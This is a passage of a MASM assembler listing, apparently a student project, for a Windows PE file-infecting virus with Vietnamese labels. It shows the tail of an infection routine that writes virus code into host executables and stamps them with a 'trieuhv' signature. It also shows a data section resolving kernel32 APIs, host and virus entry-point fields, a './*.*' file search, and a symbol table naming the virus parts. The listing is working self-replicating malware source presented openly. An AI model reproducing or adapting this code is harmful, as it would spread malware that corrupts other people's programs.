+ 0000072F  50			push eax
+ 00000730  FF B6 00000883 R	push[hFileHost + esi]
+ 00000736  FF 96 0000080B R	call[func_WriteFile + esi]
+ 0000073C  59			pop ecx
+ 0000073D  E2 DC		loop lap_fill
+
+				; -------------- - ki ten Design------------------
+ 0000073F  6A 02		push 2
+ 00000741  6A 00		push 0
+ 00000743  6A F1		push - 15
+ 00000745  FF B6 00000883 R	push[hFileHost + esi]
+ 0000074B  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000751  6A 00		push 0
+ 00000753  B8 000008CB R	mov eax, offset numOfByteWritten
+ 00000758  03 C6		add eax, esi
+ 0000075A  50			push eax
+ 0000075B  6A 0F		push 15
+ 0000075D  B8 00000B6E R	mov eax, offset VRSignature
+ 00000762  03 C6		add eax, esi
+ 00000764  50			push eax
+ 00000765  FF B6 00000883 R	push[hFileHost + esi]
+ 0000076B  FF 96 0000080B R	call[func_WriteFile + esi]
+
+ 00000771			ketThuc_layNhiem:
+ 00000771  FF B6 00000883 R	push[hFileHost + esi]
+ 00000777  FF 96 0000082E R	call[func_CloseHandle + esi]
+
+ 0000077D  5A			pop edx
+ 0000077E  59			pop ecx
+ 0000077F  5B			pop ebx
+ 00000780  58			pop eax
+ 00000781  5E			pop esi
+ 00000782  C3			ret
+
+ 00000783			layNhiemVr endp
+
+ 00000783			data_ :
+ 00000783 00			byteFill			db		0
+ 00000784 4C 61 79 20 6E	msg					db		"Lay nhiem thanh cong", 0
+	   68 69 65 6D 20
+	   74 68 61 6E 68
+	   20 63 6F 6E 67
+	   00
+ 00000799 00000000		delta				dword ?
+ 0000079D 00000000		func_GetProcAddress	dword ?
+
+ 000007A1 75 73 65 72 33	name_user32			db		"user32.dll", 0
+	   32 2E 64 6C 6C
+	   00
+ 000007AC 00000000		dll_user32 			dword ?
+ 000007B0 4D 65 73 73 61	name_MessageBoxA 	db 		"MessageBoxA", 0
+	   67 65 42 6F 78
+	   41 00
+ 000007BC 00000000		func_MessageBoxA 	dword ?
+ 000007C0 4C 6F 61 64 4C	name_LoadLibraryA	db 		"LoadLibraryA", 0
+	   69 62 72 61 72
+	   79 41 00
+ 000007CD 00000000		func_LoadLibraryA	dword ?
+ 000007D1 56 69 72 74 75	name_VirtualProtect	db		"VirtualProtect", 0
+	   61 6C 50 72 6F
+	   74 65 63 74 00
+ 000007E0 00000000		func_VirtualProtect	dword ?
+ 000007E4 43 72 65 61 74	name_CreateFile		db		"CreateFileA", 0
+	   65 46 69 6C 65
+	   41 00
+ 000007F0 00000000		func_CreateFile		dword ?
+ 000007F4 52 65 61 64 46	name_ReadFile		db		"ReadFile", 0
+	   69 6C 65 00
+ 000007FD 00000000		func_ReadFile		dword ?
+ 00000801 57 72 69 74 65	name_WriteFile		db		"WriteFile", 0
+	   46 69 6C 65 00
+ 0000080B 00000000		func_WriteFile		dword ?
+ 0000080F 53 65 74 46 69	name_SetFilePointer	db		"SetFilePointer", 0
+	   6C 65 50 6F 69
+	   6E 74 65 72 00
+ 0000081E 00000000		func_SetFilePointer	dword ?
+ 00000822 43 6C 6F 73 65	name_CloseHandle	db		"CloseHandle", 0
+	   48 61 6E 64 6C
+	   65 00
+ 0000082E 00000000		func_CloseHandle	dword ?
+ 00000832 6C 73 74 72 63	name_lstrcmp		db		"lstrcmp", 0
+	   6D 70 00
+ 0000083A 00000000		func_lstrcmp		dword ?
+ 0000083E 46 69 6E 64 46	name_FindFirstFileA	db		"FindFirstFileA", 0
+	   69 72 73 74 46
+	   69 6C 65 41 00
+ 0000084D 00000000		func_FindFirstFileA	dword ?
+ 00000851 46 69 6E 64 4E	name_FindNextFileA	db		"FindNextFileA", 0
+	   65 78 74 46 69
+	   6C 65 41 00
+ 0000085F 00000000		func_FindNextFileA	dword ?
+
+ 00000863 00000000		VAImageBaseKernelInMem		dword ?
+ 00000867 00000000		VAPEsignatureInMem			dword ?
+ 0000086B 00000000		VAExportTableInMem			dword ?
+ 0000086F 00000000		VAEAT						dword ?
+ 00000873 00000000		VAENT						dword ?
+ 00000877 00000000		VAEOT						dword ?
+
+
+ 0000087B 00000000		virusSize					dword ?
+ 0000087F 00000000		hostSize					dword ?
+
+ 00000883 00000000		hFileHost					dword ?
+ 00000887 00000000		PESignatureHost				dword ?
+ 0000088B 00000000		ImageSizeHost				dword ?
+ 0000088F 00000000		ImageSizeVr					dword ?
+ 00000893 00000000		EntryPointHost				dword ?
+ 00000897 00000000		EntryPointVr				dword ?
+ 0000089B 00000000		NumberOfSection				dword ?
+ 0000089F 00000000		SectionAlignment			dword ?
+ 000008A3 00000000		FileAlignment				dword ?
+ 000008A7 00000000		VirtualSize					dword ?
+ 000008AB 00000000		VirtualAddress				dword ?
+ 000008AF 00000000		RawSize						dword ?
+ 000008B3 00000000		RawAddress					dword ?
+ 000008B7  0000000C [		Free						db 		12 dup(? )
+	    00
+	   ]
+ 000008C3 00000000		Characteristics				dword ?
+
+ 000008C7 00000000		numOfByteToFill				dword ?
+ 000008CB 00000000		numOfByteWritten			dword ?
+ 000008CF 00000000		numOfByteRead				dword ?
+
+ 000008D3 00000000		hFindFile					dword ?
+ 000008D7 2E 5C 2A 2E 2A	PathFile					db 		".\*.*", 50 dup(0)
+	   00000032 [
+	    00
+	   ]
+ 0000090E  00000250 [		FindData					db 		592 dup(? ), 0
+	    00
+	   ] 00
+
+ 00000B5F  0000000F [		HostSignature				db		15 dup(0)
+	    00
+	   ]
+ 00000B6E 74 72 69 65 75	VRSignature					db		"trieuhv", 0
+	   68 76 00
+ 00000B76			END_VR :
+ 00000B76				_TEXT ends
+					END START
+Microsoft (R) Macro Assembler Version 14.00.24210.0	    11/22/17 17:16:49
+main.asm						     Symbols 2 - 1
+
+
+
+
+Segments and Groups:
+
+                N a m e                 Size     Length   Align   Combine Class
+
+FLAT . . . . . . . . . . . . . .	GROUP
+_DATA  . . . . . . . . . . . . .	32 Bit	 00000004 Para	  Public  'DATA'	
+_TEXT  . . . . . . . . . . . . .	32 Bit	 00000B76 Para	  Public  'CODE'	
+
+
+Procedures, parameters, and locals:
+
+                N a m e                 Type     Value    Attr
+
+layNhiemVr . . . . . . . . . . .	P Near	 000002F9 _TEXT	Length= 0000048A Public STDCALL
+  lap_1  . . . . . . . . . . . .	L Near	 00000543 _TEXT	
+  fullAlignment  . . . . . . . .	L Near	 00000614 _TEXT	
+  not_write  . . . . . . . . . .	L Near	 000006D8 _TEXT	
+  lap_fill . . . . . . . . . . .	L Near	 0000071B _TEXT	
+  ketThuc_layNhiem . . . . . . .	L Near	 00000771 _TEXT	
+timFile  . . . . . . . . . . . .	P Near	 0000029E _TEXT	Length= 0000005B Public STDCALL
+  whileFindFile  . . . . . . . .	L Near	 000002C1 _TEXT	
+  fileFirst  . . . . . . . . . .	L Near	 000002DA _TEXT	
+  koDinhDang . . . . . . . . . .	L Near	 000002F1 _TEXT	
+  breakFindFile  . . . . . . . .	L Near	 000002F3 _TEXT	
+
+
+Symbols:
+
+                N a m e                 Type     Value    Attr
+
+@CodeSize  . . . . . . . . . . .	Number	 00000000h   
+@DataSize  . . . . . . . . . . .	Number	 00000000h   
+@Interface . . . . . . . . . . .	Number	 00000003h   
+@Model . . . . . . . . . . . . .	Number	 00000007h   
+@code  . . . . . . . . . . . . .	Text   	 _TEXT
+@data  . . . . . . . . . . . . .	Text   	 FLAT
+@fardata?  . . . . . . . . . . .	Text   	 FLAT
+@fardata . . . . . . . . . . . .	Text   	 FLAT
+@stack . . . . . . . . . . . . .	Text   	 FLAT
+Characteristics  . . . . . . . .	DWord	 000008C3 _TEXT	
+END_VR . . . . . . . . . . . . .	L Near	 00000B76 _TEXT	
+EntryPointHost . . . . . . . . .	DWord	 00000893 _TEXT	
+EntryPointVr . . . . . . . . . .	DWord	 00000897 _TEXT	
+FileAlignment  . . . . . . . . .	DWord	 000008A3 _TEXT	
+FindData . . . . . . . . . . . .	Byte	 0000090E _TEXT	
+Free . . . . . . . . . . . . . .	Byte	 000008B7 _TEXT	
+HostSignature  . . . . . . . . .	Byte	 00000B5F _TEXT	
+ImageSizeHost  . . . . . . . . .	DWord	 0000088B _TEXT	
+ImageSizeVr  . . . . . . . . . .	DWord	 0000088F _TEXT	
+NumberOfSection  . . . . . . . .	DWord	 0000089B _TEXT	
+PESignatureHost  . . . . . . . .	DWord	 00000887 _TEXT	
+PathFile . . . . . . . . . . . .	Byte	 000008D7 _TEXT	
+RawAddress . . . . . . . . . . .	DWord	 000008B3 _TEXT	
+RawSize  . . . . . . . . . . . .	DWord	 000008AF _TEXT	
+START_VR . . . . . . . . . . . .	L Near	 0000001F _TEXT	
+START  . . . . . . . . . . . . .	L Near	 00000000 _TEXT	Public STDCALL
+SectionAlignment . . . . . . . .	DWord	 0000089F _TEXT	
+VAEAT  . . . . . . . . . . . . .	DWord	 0000086F _TEXT	
+VAENT  . . . . . . . . . . . . .	DWord	 00000873 _TEXT	
+VAEOT  . . . . . . . . . . . . .	DWord	 00000877 _TEXT	
+VAExportTableInMem . . . . . . .	DWord	 0000086B _TEXT	
+VAImageBaseKernelInMem . . . . .	DWord	 00000863 _TEXT	
+VAPEsignatureInMem . . . . . . .	DWord	 00000867 _TEXT	
+VRSignature  . . . . . . . . . .	Byte	 00000B6E _TEXT	
+VirtualAddress . . . . . . . . .	DWord	 000008AB _TEXT	
+VirtualProtect@16  . . . . . . .	L Near	 00000000 FLAT	External STDCALL
+VirtualSize  . . . . . . . . . .	DWord	 000008A7 _TEXT	
+__ . . . . . . . . . . . . . . .	L Near	 00000024 _TEXT	
+break_FindFuncName . . . . . . .	L Near	 000000F8 _TEXT	
+byteFill . . . . . . . . . . . .	Byte	 00000783 _TEXT	
+code_  . . . . . . . . . . . . .	L Near	 00000032 _TEXT	
+data_  . . . . . . . . . . . . .	L Near	 00000783 _TEXT	
+delta_callback . . . . . . . . .	L Near	 00000298 _TEXT	
+delta  . . . . . . . . . . . . .	DWord	 00000799 _TEXT	
+dll_user32 . . . . . . . . . . .	DWord	 000007AC _TEXT	
+end_ . . . . . . . . . . . . . .	L Near	 0000029D _TEXT	
+find_continues1  . . . . . . . .	L Near	 000000CF _TEXT	
+find_continues2  . . . . . . . .	L Near	 000000DC _TEXT	
+find_continues3  . . . . . . . .	L Near	 000000E9 _TEXT	
+find_continues . . . . . . . . .	L Near	 0000004F _TEXT	
+find_kernel32  . . . . . . . . .	L Near	 00000039 _TEXT	
+finded_kernel32  . . . . . . . .	L Near	 00000056 _TEXT	
+func_CloseHandle . . . . . . . .	DWord	 0000082E _TEXT	
+func_CreateFile  . . . . . . . .	DWord	 000007F0 _TEXT	
+func_FindFirstFileA  . . . . . .	DWord	 0000084D _TEXT	
+func_FindNextFileA . . . . . . .	DWord	 0000085F _TEXT	
+func_GetProcAddress  . . . . . .	DWord	 0000079D _TEXT	
+func_LoadLibraryA  . . . . . . .	DWord	 000007CD _TEXT	
+func_MessageBoxA . . . . . . . .	DWord	 000007BC _TEXT	
+func_ReadFile  . . . . . . . . .	DWord	 000007FD _TEXT	
+func_SetFilePointer  . . . . . .	DWord	 0000081E _TEXT	
+func_VirtualProtect  . . . . . .	DWord	 000007E0 _TEXT	
+func_WriteFile . . . . . . . . .	DWord	 0000080B _TEXT	
+func_lstrcmp . . . . . . . . . .	DWord	 0000083A _TEXT	
+hFileHost  . . . . . . . . . . .	DWord	 00000883 _TEXT	
+hFindFile  . . . . . . . . . . .	DWord	 000008D3 _TEXT	
+hostSize . . . . . . . . . . . .	DWord	 0000087F _TEXT	
+msg  . . . . . . . . . . . . . .	Byte	 00000784 _TEXT	
+name_CloseHandle . . . . . . . .	Byte	 00000822 _TEXT	
+name_CreateFile  . . . . . . . .	Byte	 000007E4 _TEXT	
+name_FindFirstFileA  . . . . . .	Byte	 0000083E _TEXT	
+name_FindNextFileA . . . . . . .	Byte	 00000851 _TEXT	
+name_LoadLibraryA  . . . . . . .	Byte	 000007C0 _TEXT	
+name_MessageBoxA . . . . . . . .	Byte	 000007B0 _TEXT	
+name_ReadFile  . . . . . . . . .	Byte	 000007F4 _TEXT	
+name_SetFilePointer  . . . . . .	Byte	 0000080F _TEXT	
+name_VirtualProtect  . . . . . .	Byte	 000007D1 _TEXT	
+name_WriteFile . . . . . . . . .	Byte	 00000801 _TEXT	
+name_lstrcmp . . . . . . . . . .	Byte	 00000832 _TEXT	
+name_user32  . . . . . . . . . .	Byte	 000007A1 _TEXT	
+numOfByteRead  . . . . . . . . .	DWord	 000008CF _TEXT	
+numOfByteToFill  . . . . . . . .	DWord	 000008C7 _TEXT	
+numOfByteWritten . . . . . . . .	DWord	 000008CB _TEXT	
+temp . . . . . . . . . . . . . .	DWord	 00000000 _DATA	
+virusSize  . . . . . . . . . . .	DWord	 0000087B _TEXT	
+whileFindFuncName  . . . . . . .	L Near	 000000B5 _TEXT	
+while_findAddr . . . . . . . . .	L Near	 00000101 _TEXT	
+
+	   0 Warnings
+	   0 Errors
